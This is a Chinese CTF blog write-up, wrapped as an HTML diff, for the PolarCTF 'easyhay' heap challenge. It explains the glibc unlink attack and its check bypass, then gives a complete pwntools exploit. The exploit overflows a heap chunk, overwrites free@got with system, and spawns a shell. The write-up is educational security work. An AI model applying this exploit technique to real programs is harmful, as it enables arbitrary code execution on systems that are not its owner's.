@@ -1,0 +1,207 @@
+<!DOCTYPE html><html lang="zh_CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Unl1nk | L1nk's Blog</title><meta name="author" content="L1nk"><meta name="copyright" content="L1nk"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="unlink攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unl1nk">
+<meta property="og:url" content="http://example.com/2025/04/29/easyhay/index.html">
+<meta property="og:site_name" content="L1nk&#39;s Blog">
+<meta property="og:description" content="unlink攻击">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/cover/unlink.jpg">
+<meta property="article:published_time" content="2025-04-29T05:52:39.440Z">
+<meta property="article:modified_time" content="2025-04-29T06:28:55.225Z">
+<meta property="article:author" content="L1nk">
+<meta property="article:tag" content="堆溢出">
+<meta property="article:tag" content="GOT劫持">
+<meta property="article:tag" content="unlink">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/cover/unlink.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Unl1nk",
+  "url": "http://example.com/2025/04/29/easyhay/",
+  "image": "http://example.com/image/cover/unlink.jpg",
+  "datePublished": "2025-04-29T05:52:39.440Z",
+  "dateModified": "2025-04-29T06:28:55.225Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "L1nk",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/image/icon.jpg"><link rel="canonical" href="http://example.com/2025/04/29/easyhay/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Unl1nk',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg" style="background-image: url(/image/cover/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/icon.jpg" onerror="this.onerror=null;this.src='/img/icon.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">L1nk's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Unl1nk</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Unl1nk</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-04-29T05:52:39.440Z" title="Created 2025-04-29 13:52:39">2025-04-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-04-29T06:28:55.225Z" title="Updated 2025-04-29 14:28:55">2025-04-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言:"></a>0x00 前言:</h1><p>堆学习之路还在继续，上周末打了ACTF，被几道Pwn题吓死了，上来就是IO、内核。唉，所以还是继续慢慢往上爬吧，希望总有一天能解出XCTF联赛的Pwn题</p>
+<h1 id="0x01-分析："><a href="#0x01-分析：" class="headerlink" title="0x01 分析："></a>0x01 分析：</h1><p>一道用来熟悉 unlink 的题目，题目是来自[PolarD&amp;N].(<a target="_blank" rel="noopener" href="https://polarctf.com/#/page/challenges)%E7%9A%84**easyhay**%E3%80%82">https://polarctf.com/#/page/challenges)的**easyhay**。</a><br>Checksec 一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x3ff000)</span><br><span class="line">RUNPATH:    b&#x27;/home/link/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/&#x27;</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>
+<p>Patch 过了，值得注意的是没开 pie，这对我们 unlink 攻击起到了关键的作用，ida 启动</p>
+<h2 id="以为是unosrted-bin-attack"><a href="#以为是unosrted-bin-attack" class="headerlink" title="以为是unosrted bin attack?"></a>以为是unosrted bin attack?</h2><p><img src="/image/unlink1.png">经典菜单堆，看到 <code>v3 == 4869</code> 这个分支，先跟进一下 <code>l33t();</code><br><img src="/image/unlink2.png">看到这里，我下意识以为又是一道 <code>unosrted bin attack</code>，结果照着思路把 exp 搓出来之后发现：<br><img src="/image/unlink3.png">确实能走到这个分支，但是被摆了一道。</p>
+<h2 id="老实学unlink吧"><a href="#老实学unlink吧" class="headerlink" title="老实学unlink吧^^"></a>老实学unlink吧^^</h2><p>看完官方 wp 才知道，原来是要打 <code>unlink</code>，首先得知道 <code>unlink</code> 是什么，有什么用。简单来说就是 free 掉当前 chunk 的时候和目前物理相邻的 free chunk 进行合并，简单示意图如下：<br><img src="/image/unlink4.png">这里描述可能不太清晰，可以大概看一下源码，这里就直接偷星盟的 PWN 课里的了（懒得找）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*malloc.c int_free函数中*/</span></span><br><span class="line"><span class="comment">/*这里p指向当前malloc_chunk结构体*/</span></span><br><span class="line"><span class="keyword">if</span>(!prev_inuse(p))&#123;</span><br><span class="line">    prevsize=p-&gt;prev_size;</span><br><span class="line">    size+=prevsize;</span><br><span class="line"><span class="comment">//修改当前chunk的指针，指向前一个chunk。</span></span><br><span class="line">    p=chunk_at_offset(p,-((<span class="type">long</span>)prevsize));</span><br><span class="line">    unlink(p,bck,fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这一段的意思是，若检测到 p（也就是被 free 的 chunk）的 prev_inuse 位为 0，也就是当前 chunk 的前一个 chunk 是空闲状态(被 free)，则进行操作：</p>
+<ol>
+<li><code>presize</code> 变量储存前一个空闲堆块的 <code>presize</code></li>
+<li><code>size</code> 变量变为当前 chunk 的 <code>size</code> 加上前一个空闲 chunk 的 <code>size</code></li>
+<li>修改指向当前 chunk 的指针，利用 <code>presize</code> 去寻找前一个 chunk 的位置</li>
+<li>进行 unlink 操作<br>简单画个示意图：<br><img src="/image/unlink5.png">经过上面的操作会变成：<br><img src="/image/unlink6.png">然后就是进入 unlink 操作，来看看源码</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//相关函数说明：</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p,s) ((mchunkptr)(((char*) (p))+(s)))</span></span><br><span class="line"><span class="comment">/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P,BK,FD)&#123;</span></span><br><span class="line">    FD = P -&gt; fd;</span><br><span class="line">    BK = P -&gt; bk;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_expect(FD-&gt;bk!=P||BK-&gt;fd!=P,<span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action,<span class="string">&quot;corrupted double-linked list&quot;</span>,P,AV);</span><br><span class="line">    FD-&gt; bk = BK;</span><br><span class="line">    BK-&gt; fd = FD;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>值得注意的是，这里的 <code>FD</code> 和 <code>BK</code> 都是临时变量，中间还有一段检测。接下来详细说明一下 <code>unlink</code> 攻击是如何发挥作用的以及如何绕过 <code>unlink</code> 的检测</p>
+<h2 id="还有检测-绕一下"><a href="#还有检测-绕一下" class="headerlink" title="还有检测?绕一下"></a>还有检测?绕一下</h2><p>首先伪造一下 <code>fake chunk</code>, 注意这里的 fakechunk 可以是在一个正常的chunk 中所伪造出来的，例如：<br><img src="/image/unlink7.png"></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fake_chunk = <span class="number">0x0000000006020E0</span></span><br><span class="line">P_fd = chunk - <span class="number">0x18</span> = <span class="number">0x6020c8</span></span><br><span class="line">P_bk = chunk - <span class="number">0x10</span> = <span class="number">0x6020c0</span></span><br></pre></td></tr></table></figure>
+<p>这里 <code>fake chunk</code> 的选择是比较关键的，必须是选择在程序中存储堆块的一段内存，例如在这道题的创建堆块的函数这里:<br><img src="/image/unlink8.png">显然 <code>heaparray</code> 的作用就是用来管理堆块的。<br>然后我们将这些伪造的值代入到源码中来看一下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P,BK,FD)&#123;</span></span><br><span class="line">    FD = P -&gt; fd; <span class="comment">// FD = 0x6020c8</span></span><br><span class="line">    BK = P -&gt; bk; <span class="comment">// BK = 0x6020c0</span></span><br><span class="line">    <span class="keyword">if</span>(__builtin_expect(FD-&gt;bk!=P||BK-&gt;fd!=P,<span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action,<span class="string">&quot;corrupted double-linked list&quot;</span>,P,AV);</span><br><span class="line">    <span class="comment">// FD-&gt;bk = *(FD+0X18) = *(fake_chunk) = *(0x6020E0) = P</span></span><br><span class="line">    <span class="comment">// BK-&gt;fd = *(BK+0X10) = *(fake_chunk) = *(0x6020E0) = P</span></span><br><span class="line">    FD-&gt; bk = BK;</span><br><span class="line">    <span class="comment">// *(FD+0X18) -&gt; *(6020E0) = 0x6020c0</span></span><br><span class="line">    BK-&gt; fd = FD;</span><br><span class="line">    <span class="comment">// *(BK+0X10) -&gt; *(6020E0) = 0x6020c8</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简单解释一下绕过检测这里：</p>
+<ul>
+<li><code>FD-&gt;bk</code> 的寻找方式是直接通过 <code>FD + 0x18</code> 来找到的，同理 <code>BK-&gt;fd</code> 也是。</li>
+<li>这是因为 chunk 的结构就是这样 <code>pre_szie</code>, <code>size</code>, <code>fd</code>, <code>bk</code>，系统会直接通过指向 chunk 头的指针加上特定的偏移来寻找对应的结构，<code>P+0x8</code> 就是 size，<code>+0x10</code> 就是 <code>fd</code><br>因为经过我们的伪造，选取了特定的位置来作为 P，此时 <code>0x6020E0</code> 就是题目中的 <code>heaparray[0]</code>，也就是用于管理堆块的内存，同时这个位置上存放了一个堆块的指针，也就是 <code>P</code><br><img src="/image/unlink9.png">这样我们便绕过了 unlink 的检测，后面就是一个赋值的操作：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt; bk = BK;</span><br><span class="line"><span class="comment">// *(FD+0X18) -&gt; *(6020E0) = 0x6020c0</span></span><br><span class="line">BK-&gt; fd = FD;</span><br><span class="line"><span class="comment">// *(BK+0X10) -&gt; *(6020E0) = 0x6020c8</span></span><br></pre></td></tr></table></figure>
+<p>简单来说就是 heaparray 这里被赋值成了 <code>0x6020c8</code> ,也就是 <code>heaparray - 0x18</code>。那么在程序中如果进入了堆编辑功能的这个分支：<br><img src="/image/unlink10.png">它是通过 <code>heaparray</code> 来寻找堆块的，我们刚刚已经把 <code>heaparray[0]</code> 改变成了 <code>heaparray - 0x18</code>，那么系统就会将 <code>heaparray - 0x18</code> 当成一个堆块，往上面写数据，如果我们再随便申请一个堆块，通过对 <code>heaparray[0]</code> 的编辑，再将后续堆块的地址修改为 <code>got</code> 表之类的地方，就能实现劫持 GOT 。</p>
+<h2 id="EXPEXP"><a href="#EXPEXP" class="headerlink" title="EXPEXP"></a>EXPEXP</h2><p>这就是 <code>unlink</code> 攻击能起到的作用，理清了思路，跟着 exp 来一遍：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>首先是申请 3 个堆块，最后一个堆块用于隔断 <code>top chunk</code>，并且提前写入 <code>/bin/sh\x00</code>，因为我们的目标是劫持 <code>free@got</code>, 将其改为 <code>system</code>。<br>然后对 <code>chunk 0</code> 写入我们伪造的 <code>fake chunk</code>，因为编辑函数没有检测写入内容的大小，可以堆溢出，我们就可以很方便的设置 <code>chunk 1</code> 中的 <code>pre_size</code> 和 <code>size</code> 位的 <code>preinuse</code> 位</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fd = <span class="number">0x0000000006020E0</span> - <span class="number">0x18</span></span><br><span class="line">bk = <span class="number">0x0000000006020E0</span> - <span class="number">0x10</span></span><br><span class="line">payload=flat(<span class="number">0</span>,<span class="number">0x21</span>,fd,bk,<span class="number">0x20</span>,<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>
+<p>接下来 free 掉 <code>chunk 1</code>，回顾 unlink 的操作，我们把 <code>heaparray[0]</code> 的修改成了 <code>heaparray - 0x18</code>:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>效果： <img src="/image/unlink11.png">接下来对 <code>heaparry[1]</code> 的位置写入 <code>free@got</code>，然后 free 掉内容为 <code>/bin/sh\x00</code> 的堆块即可 getshell。</p>
+<h1 id="0X02-EXP"><a href="#0X02-EXP" class="headerlink" title="0X02 EXP:"></a>0X02 EXP:</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">file=<span class="string">&#x27;/mnt/c/Users/Z2023/Desktop/easyhay&#x27;</span></span><br><span class="line">elf=ELF(file)</span><br><span class="line"></span><br><span class="line">choice = <span class="number">0x00</span></span><br><span class="line"><span class="keyword">if</span> choice:</span><br><span class="line">    port= <span class="number">2072</span></span><br><span class="line">    polar=<span class="string">&#x27;1.95.36.136&#x27;</span></span><br><span class="line">    nss=<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span></span><br><span class="line">    buu=<span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">    local=<span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">    kap0k=<span class="string">&#x27;ctf.kap0k.top&#x27;</span></span><br><span class="line">    ucsc=<span class="string">&#x27;39.107.58.236&#x27;</span></span><br><span class="line">    p = remote(polar,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> x,data             :p.sendafter(x, data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> x,data             :p.sendlineafter(x, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recvline(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> x                  :p.recvuntil(x)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uru64   = <span class="keyword">lambda</span>                    :uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:])</span><br><span class="line">leak    = <span class="keyword">lambda</span> name               :log.success(<span class="string">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(<span class="built_in">eval</span>(name))))</span><br><span class="line">libc_os   = <span class="keyword">lambda</span> x                :libc_base + x</span><br><span class="line">libc_sym  = <span class="keyword">lambda</span> x                :libc_os(libc.sym[x])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="keyword">if</span> choice==<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span>  </span><br><span class="line">        <span class="comment"># gdb.attach(p,cmd)</span></span><br><span class="line">        gdb.attach(p,<span class="string">&#x27;b *0x400ca2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sla(<span class="string">&#x27;Content of heap : &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">debug() </span><br><span class="line">malloc(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fd = <span class="number">0x0000000006020E0</span> - <span class="number">0x18</span></span><br><span class="line">bk = <span class="number">0x0000000006020E0</span> - <span class="number">0x10</span></span><br><span class="line">payload=flat(<span class="number">0</span>,<span class="number">0x21</span>,fd,bk,<span class="number">0x20</span>,<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(fd) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">L1nk</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/29/easyhay/">http://example.com/2025/04/29/easyhay/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/">堆溢出</a><a class="post-meta__tags" href="/tags/GOT%E5%8A%AB%E6%8C%81/">GOT劫持</a><a class="post-meta__tags" href="/tags/unlink/">unlink</a></div><div class="post-share"><div class="social-share" data-image="/image/cover/unlink.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/04/03/PWN_Emo_Chunk%201/" title="当无脑将__malloc_hook覆盖成one_gadget但所有one_gadget都打不通的时候该怎么做"><img class="cover" src="/image/cover/malloc.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-03</div><div class="info-item-2">当无脑将__malloc_hook覆盖成one_gadget但所有one_gadget都打不通的时候该怎么做</div></div><div class="info-2"><div class="info-item-1">0x01 前言做到这题的时候想到一个严重的问题，这种菜单堆题以前我都是怎么做的呢？都是通过堆溢出&#x2F;uaf 在 __malloc_hook 附近伪造一个 fake chunk 然后将其申请下来，再通过堆编辑来将原本的 __malloc_hook 覆盖成 one_gadget。尝试运行一遍打不通，就换一个 one_gadget，但是其实我没有想过为什么会打不通以及当所有 one_gadget 都打不通的时候怎么办？ 0x02 如何解决？ 学到了一个新的手段，我们可以利用 realloc 来调整栈帧，在网络上搜索到了一篇博客，大佬详细解释了我上面的问题以及如何解决，现在用一道会有这种情况的题目来实际操作一下，题目是PolarCTF2023秋季个人挑战赛的Emo_chunk  0x03 分析：Checksec：Patch 过了，顺便吐槽一下这个靶场好多堆题都不给 libc 版本，但是看官方解说视频又不说为什么用他那个版本，看到视频里用的是 libc.2.23 就用 2.23 来 patch 了。上 ida：典型菜单堆题，而且有 shell 函数:但是我一开始没有看到，用了...</div></div></div></a><a class="pagination-related" href="/2025/04/25/UCSC%20CTF%202025%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E5%90%88%E9%80%89%E6%8B%94%E8%B5%9B%20PWN%20%E9%A2%98%E8%A7%A3/" title="UCSC CTF 2025高校网络安全联合选拔赛 PWN 题解"><img class="cover" src="/image/cover/UCSC.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-25</div><div class="info-item-2">UCSC CTF 2025高校网络安全联合选拔赛 PWN 题解</div></div><div class="info-2"><div 